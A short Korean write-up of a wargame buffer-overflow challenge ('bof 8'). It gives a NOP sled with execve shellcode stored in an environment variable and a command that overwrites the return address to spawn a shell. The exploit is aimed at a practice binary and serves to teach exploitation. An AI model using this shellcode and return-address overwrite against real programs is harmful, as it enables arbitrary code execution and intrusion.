# bof 8

일단 다른 문제와 다르게 getenv를 통해서 환경변수를 이용하라고 어필하고 있으니 환경변수를 이용해 보도록하자

환경변수는 다음과 같은 코드로 작성할 수 있다.

``` bash
$ export SHELLCODE=`python -c 'print "\x90"*1000+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
```

성공확률을 높이기 위해 Red-sled, 즉 \x90을 채워 넣었으며 나머지는 쉘코드이다.

우리는 환경변수에 shellcode를 삽입하였기 때문에 ret 주소에 해당 주소를 넣어주면 그만이다. 따라서 buffer(8 byte)+SFP(8 byte) = 16 byte 를 dummy로 채워주고 ret 주소는 printf를 통해 출력되는 주소를 넣어주면 된다. 

따라서 터미널에 입력해야 하는 명령은 다음과 같다.

``` bash
$ (python -c 'print "a"*16+"\xe1\xea\xff\xff\xff\x7f\x00\x00"';cat) | ./bof8
```